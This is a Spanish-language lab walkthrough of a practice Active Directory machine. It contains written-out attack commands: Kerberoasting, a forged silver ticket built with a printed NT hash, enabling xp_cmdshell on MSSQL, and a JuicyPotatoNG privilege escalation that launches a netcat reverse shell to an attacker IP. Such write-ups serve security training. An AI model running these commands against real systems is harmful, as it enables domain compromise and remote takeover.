#ActiveDirectory #medium #windows 
### Ping
```python
ping -c 1 10.10.11.168
PING 10.10.11.168 (10.10.11.168) 56(84) bytes of data.
64 bytes from 10.10.11.168: icmp_seq=1 ttl=127 time=156 ms

--- 10.10.11.168 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 155.962/155.962/155.962/0.000 ms
```

### TTL 127=Windows

### nmap
```python
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Scramble Corp Intranet
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-04-01 22:16:40Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2024-04-01T22:04:24
|_Not valid after:  2025-04-01T22:04:24
|_ssl-date: 2024-04-01T22:19:53+00:00; -1m03s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2024-04-01T22:19:53+00:00; -1m03s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2024-04-01T22:04:24
|_Not valid after:  2025-04-01T22:04:24
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.10.11.168:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-04-01T22:14:22
|_Not valid after:  2054-04-01T22:14:22
|_ssl-date: 2024-04-01T22:19:53+00:00; -1m03s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2024-04-01T22:19:53+00:00; -1m03s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2024-04-01T22:04:24
|_Not valid after:  2025-04-01T22:04:24
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2024-04-01T22:19:53+00:00; -1m03s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2024-04-01T22:04:24
|_Not valid after:  2025-04-01T22:04:24
4411/tcp  open  found?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  msrpc         Microsoft Windows RPC
49725/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please sub
mit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4411-TCP:V=7.94SVN%I=7%D=4/1%Time=660B3287%P=x86_64-pc-linux-gnu%r(
SF:NULL,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(GenericLines,1D,"SCRAMBL
SF:ECORP_ORDERS_V1\.0\.3;\r\n")%r(GetRequest,35,"SCRAMBLECORP_ORDERS_V1\.0
SF:\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(HTTPOptions,35,"SCRAMBLECORP_ORD
SF:ERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RTSPRequest,35,"SCRAMBL
SF:ECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RPCCheck,1D,"S
SF:CRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(DNSVersionBindReqTCP,1D,"SCRAMBLEC
SF:ORP_ORDERS_V1\.0\.3;\r\n")%r(DNSStatusRequestTCP,1D,"SCRAMBLECORP_ORDER
SF:S_V1\.0\.3;\r\n")%r(Help,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNK
SF:NOWN_COMMAND;\r\n")%r(SSLSessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r
SF:\n")%r(TerminalServerCookie,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(T
SF:LSSessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(Kerberos,1D,"SCR
SF:AMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(SMBProgNeg,1D,"SCRAMBLECORP_ORDERS_V
SF:1\.0\.3;\r\n")%r(X11Probe,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(Fou
SF:rOhFourRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMA
SF:ND;\r\n")%r(LPDString,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOW
SF:N_COMMAND;\r\n")%r(LDAPSearchReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n"
SF:)%r(LDAPBindReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(SIPOptions,35
SF:,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(LANDe
SF:sk-RC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TerminalServer,1D,"SCRA
SF:MBLECORP_ORDERS_V1\.0\.3;\r\n")%r(NCP,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;
SF:\r\n")%r(NotesRPC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(JavaRMI,1D,
SF:"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(WMSRequest,1D,"SCRAMBLECORP_ORDE
SF:RS_V1\.0\.3;\r\n")%r(oracle-tns,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")
SF:%r(ms-sql-s,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(afp,1D,"SCRAMBLEC
SF:ORP_ORDERS_V1\.0\.3;\r\n")%r(giop,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n
SF:");
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -1m03s, deviation: 0s, median: -1m03s
| smb2-time: 
|   date: 2024-04-01T22:19:13
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Apr  1 18:20:59 2024 -- 1 IP address (1 host up) scanned in 242.46 seconds
```

### Enumeración del puerto 80 (http)
tenemos una nota que dice que todas las autenticaciones serán a través de kerberos debido a que han deshabilitado la autenticación NTLM
![[Pasted image 20240612123058.png]]

`Suporte tecnico` 
Al pulsar en la opción Contactar con el soporte informático podremos encontrar una captura de pantalla que revela un posible
nombre de usuario.
![[Pasted image 20240612123104.png]]

### Kerbrute 
vamos a validar si el usuario existe a nivel de dominio usando `kerbrute`
```python
kerbrute -users creds -domain scrm.local -dc-ip 10.10.11.168 # este comando nos permite enumerar los usuarios dentro del archivo creds
```

![[Pasted image 20240612123111.png]]

### impacket-smbclient
podemos autenticarnos con el usuario. 
![[Pasted image 20240612123116.png]]

`PDF`
encontramos un archivo PDF que podría ser valioso
![[Pasted image 20240612123123.png]]

`PDF`
El archivo PDF nos da una pista sobre una base de datos SQL que contiene credenciales valiosas y está restringida solo para administradores. También menciona Kerberos. nos da una pista para analizar los ataques basados en Kerberos contra el servicio SQL
![[Pasted image 20240612123129.png]]

### Kerbrute
usaremos kerbrute para intentar validar las credenciales del usuario y usaremos el mismo nombre para la contraseña, de esta manera conseguimos un `TGT(Tickect Granting Tickect)` del usuario
![[Pasted image 20240612123135.png]]

### impacket-GetUserSPNs 
con impacket no podemos conseguir un `TGT(Tickect Granting Tickect)` debido a que la autenticación NTLM esta desactivada. 
![[Pasted image 20240612123148.png]]

`si forzamos a que el ataque sea por kerberos (-k) continuamos con el error`
![[Pasted image 20240612123154.png]]

`error -k options`
podemos conseguir en internet como resolver el problema de la autenticación de la siguiente manera
![[Pasted image 20240612123159.png]]

`editamos el escript`
![[Pasted image 20240612123204.png]]

### impacket-GetUserSPNs 
de esta manera podemos conseguir escapar el problema de la autenticación NTLM 
```python
impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -k -dc-host dc1.scrm.local
```
obtenemos un usuario `sqlsvc` esto parece ser la propia cuenta del propio servicio `mssql` 
![[Pasted image 20240612123210.png]]

### impacket-GetUserSPNs - request
de esta manera podemos solicitar un NTMLv2 que es un hash del usuario
![[Pasted image 20240612123216.png]]

### john
usamos john para crackear el hash
![[Pasted image 20240612123223.png]]

### Kerbrute
obtenemos un `TGT` para el usuario `sqlsvc`
![[Pasted image 20240612123228.png]]

### impacket-getPac 
vamos a obtener el domain-sid 
![[Pasted image 20240612123233.png]]

`Domain-SID`
![[Pasted image 20240612123240.png]]


### impacket-tiketer
de esta manera realizamos un `SILVER TICKET ATTACK` para obtener un `TGS (TICKET GRANTING TICKET` del usuario Administrator
```python
impacket-ticketer -spn MSSQLSvc/dc1.scrm.local -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -dc-ip dc1.scrm.local -nthash b999a16500b87d17ec7f2e2a68778f05 Administrator -domain scrm.local
```

![[Pasted image 20240612123247.png]]

### impacket-mssqlclient
obtenemos acceso a la base la cual podemos enumerar
![[Pasted image 20240612123307.png]]

### DataBases
enumerando la base de datos podemos obtener información sobre un usuario.
![[Pasted image 20240612123312.png]]

### crackmapexec
con crackmapexec podemos validar las credenciales que hemos conseguido. las cuales son validas para enumerar el servicio SMB y HTTP
![[Pasted image 20240612123317.png]]

### Configuración Database
```python
1. SP_CONFIGURE "show advanced options", 1 # Este comando habilita la visualización de opciones avanzadas de configuración en el SQL Server. Al establecer el valor en 1, se activan las opciones avanzadas de configuración. Esto es necesario para cambiar configuraciones específicas del servidor.

2. RECONFIGURE # Este comando se utiliza para aplicar cambios en la configuración del servidor después de modificar las opciones. Después de cambiar una configuración con `SP_CONFIGURE`, es necesario ejecutar `RECONFIGURE` para que los cambios surtan efecto.

3. `SP_CONFIGURE "xp_cmdshell", 1` # Este comando habilita el comando `xp_cmdshell` en SQL Server. `xp_cmdshell` es una función extendida de SQL Server que permite ejecutar comandos del sistema operativo desde dentro de una consulta SQL.

4. `xp_cmdshell "whoami"` # Este comando utiliza `xp_cmdshell` para ejecutar el comando `whoami` del sistema operativo. En este caso, devuelve el nombre del usuario actual del sistema operativo bajo el cual se está ejecutando el proceso de SQL Server.
```

![[Pasted image 20240612123325.png]]

### netcat
vamos a copiar el binario de netcat al directorio de trabajo 
![[Pasted image 20240612123330.png]]

`Python3 -m http.server 80`
![[Pasted image 20240612123334.png]]

### rlwrap
obtenemos acceso.
![[Pasted image 20240612123339.png]]

### Escalada De Privilegios
tenemos privilegios sobre el servicio `SeImpersonatePrivilege` 
![[Pasted image 20240612123344.png]]

### JuicyPotatoNG.exe
subimos la herramienta a la maquina victima
`JuicyPotatoNG.exe es una herramienta utilizada que aprovecha una característica del sistema conocida como "Token Impersonation" para escalar privilegios.`
![[Pasted image 20240612123350.png]]

### Impersonate
```python
.\JuicyPotatoNG.exe -t * -p C:\Windows\System32\cmd.exe -a "/c C:\Temp\netcat.exe -e cmd 10.10.14.58 7890"
```
con este comando lanzamos la herramienta para que ejecute `C:\Windows\System32\cmd.exe -a "/c C:\Temp\netcat.exe -e cmd 10.10.14.58 7890"` ya que tenemos el `netcat.exe` que lo hemos cargado anteriormente podemos lanzarlo de manera privilegiada
![[Pasted image 20240612123358.png]]

### WE ARE ROOT
